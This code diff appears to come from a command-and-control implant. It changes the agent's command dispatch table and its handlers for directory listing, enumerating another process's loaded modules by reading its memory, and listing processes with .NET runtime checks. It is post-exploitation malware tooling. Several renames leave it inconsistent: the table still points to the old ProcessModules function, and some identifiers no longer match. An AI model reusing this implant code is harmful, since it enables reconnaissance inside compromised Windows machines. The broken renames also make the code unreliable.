@@ -9,12 +9,12 @@ namespace Commands {
 
     HASH_MAP
         __attribute__((used, section(".rdata"))) cmd_map[] = {
-        { .name = DIRECTORYLIST, 	.address = (void*) Commands::DirectoryList        },
-        { .name = PROCESSMODULES,   .address = (void*) Commands::ProcessModules       },
-        { .name = PROCESSLIST,	    .address = (void*) Commands::ProcessList          },
-        { .name = ADDPEER,		    .address = (void*) Commands::CommandAddPeer       },
-        { .name = REMOVEPEER,		.address = (void*) Commands::CommandRemovePeer    },
-        { .name = SHUTDOWN,		    .address = (void*) Commands::Shutdown             },
+        { .name = DIRECTORYLIST, 	.address = (VOID*) Commands::DirectoryList        },
+        { .name = PROCESSMODULES,   .address = (VOID*) Commands::ProcessModules       },
+        { .name = PROCESSLIST,	    .address = (VOID*) Commands::ProcessList          },
+        { .name = ADDPEER,		    .address = (VOID*) Commands::CommandAddPeer       },
+        { .name = REMOVEPEER,		.address = (VOID*) Commands::CommandRemovePeer    },
+        { .name = SHUTDOWN,		    .address = (VOID*) Commands::Shutdown             },
         { .name = 0,				.address = nullptr		                        },
     };
 
@@ -23,16 +23,16 @@ namespace Commands {
 
         STREAM *out = CreateTaskResponse(DIRECTORYLIST);
 
-        ULONG size      = 0;
-        HANDLE handle   = nullptr;
+        ULONG size = 0;
+        HANDLE handle = nullptr;
 
-        WIN32_FIND_DATAA head       = { };
-        ULARGE_INTEGER file_size    = { };
-        SYSTEMTIME access_time      = { };
-        SYSTEMTIME sys_time         = { };
+        WIN32_FIND_DATAA head = { };
+        ULARGE_INTEGER file_size = { };
+        SYSTEMTIME access_time = { };
+        SYSTEMTIME sys_time = { };
 
-        const auto dir_string     = UnpackString(parser, nullptr);
-        const auto path_buffer    = (char*) Malloc(MAX_PATH);
+        const auto dir_string = UnpackString(parser, nullptr);
+        const auto path_buffer = (CHAR*)Malloc(MAX_PATH);
 
         if (dir_string[0] == PERIOD) {
             if (!(size = ctx->win32.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
@@ -44,8 +44,8 @@ namespace Commands {
                 path_buffer[size++] = BSLASH;
             }
 
-            path_buffer[size++]  = ASTER;
-            path_buffer[size]    = NULTERM;
+            path_buffer[size++] = ASTER;
+            path_buffer[size] = NULTERM;
         }
         else {
             MemCopy(path_buffer, dir_string, MAX_PATH);
@@ -61,8 +61,7 @@ namespace Commands {
 
                 if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                     PackUint32(out, TRUE);
-                }
-                else {
+                } else {
                     file_size.HighPart   = head.nFileSizeHigh;
                     file_size.LowPart    = head.nFileSizeLow;
 
@@ -96,43 +95,43 @@ namespace Commands {
         }
     }
 
-    VOID ProcessModules (PARSER *parser) {
+    VOID ProcessMods (PARSER *parser) {
         HEXANE;
 
-        STREAM *out = CreateTaskResponse(PROCESSMODULES);
+        STREAM *out = CreateTaskResponse(PROCESSMODULE);
 
-        LDR_DATA_TABLE_ENTRY module     = { };
-        PROCESS_BASIC_INFORMATION pbi   = { };
+        LDR_DATA_TABLE_ENTRY mod = { };
+        PROCESS_BASIC_INFORMATION pbi = { };
 
-        PPEB_LDR_DATA loads         = nullptr;
-        PLIST_ENTRY head 	        = nullptr;
-        PLIST_ENTRY entry           = nullptr;
-        HANDLE process              = nullptr;
+        PPEB_LDR_DATA loads = nullptr;
+        PLIST_ENTRY head = nullptr;
+        PLIST_ENTRY entry = nullptr;
+        HANDLE process = nullptr;
 
-        CHAR modname_a[MAX_PATH]  = { };
+        CHAR modname_a[MAX_PATH] = { };
         WCHAR modname_w[MAX_PATH] = { };
 
-        UINT32 pid    = 0;
-        UINT32 count  = 0;
-        SIZE_T size   = 0;
+        UINT32 pid = 0;
+        UINT32 count = 0;
+        SIZE_T size = 0;
 
         x_assert(pid = GetProcessIdByName(UnpackString(parser, nullptr)));
         x_ntassert(NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
         x_ntassert(ctx->win32.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
         x_ntassert(ctx->win32.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
-        x_ntassert(ctx->win32.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
+        x_ntassert(ctx->win32.NtReadVirtualMemory(process, &loads->InMemoryOrderModList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
 
-        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = module.InMemoryOrderLinks.Flink) {
-            x_ntassert(ctx->win32.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
-            x_ntassert(ctx->win32.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
-            x_assert(size == module.FullDllName.Length);
+        for (head = &loads->InMemoryOrderModList; entry != head; entry = mod.InMemoryOrderLinks.Flink) {
+            x_ntassert(ctx->win32.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &mod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
+            x_ntassert(ctx->win32.NtReadVirtualMemory(process, mod.FullDllName.Buffer, &modname_w, mod.FullDllName.Length, &size));
+            x_assert(size == mod.FullDllName.Length);
 
-            if (module.FullDllName.Length > 0) {
-                size = WcsToMbs(modname_a, modname_w, module.FullDllName.Length);
+            if (mod.FullDllName.Length > 0) {
+                size = WcsToMbs(modname_a, modname_w, mod.FullDllName.Length);
 
                 PackString(out, modname_a);
-                PackPointer(out, module.DllBase);
+                PackPointer(out, mod.DllBase);
                 count++;
             }
 
@@ -150,12 +149,12 @@ namespace Commands {
         STREAM *out = CreateTaskResponse(PROCESSLIST);
         PROCESSENTRY32 entries = { };
 
-        HANDLE snapshot             = nullptr;
-        HANDLE process              = nullptr;
+        HANDLE snapshot = nullptr;
+        HANDLE process = nullptr;
 
-        IEnumUnknown *enums         = nullptr;
-        ICLRMetaHost *meta          = nullptr;
-        ICLRRuntimeInfo *runtime    = nullptr;
+        IEnumUnknown *enums = nullptr;
+        ICLRMetaHost *meta = nullptr;
+        ICLRRuntimeInfo *runtime = nullptr;
 
         WCHAR buffer[1024] = { };
         DWORD size = 0;
@@ -167,12 +166,12 @@ namespace Commands {
         x_assert(ctx->win32.Process32First(snapshot, &entries));
 
         do {
-            CLIENT_ID cid       = { };
-            cid.UniqueThread    = nullptr;
-            cid.UniqueProcess   = (void*) entries.th32ProcessID;
+            CLIENT_ID cid= { };
+            cid.UniqueThread = nullptr;
+            cid.UniqueProcess = (void*) entries.th32ProcessID;
 
-            BOOL is_managed  = false;
-            BOOL is_loaded   = false;
+            BOOL is_managed = false;
+            BOOL is_loaded = false;
 
             OBJECT_ATTRIBUTES attr = { };
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
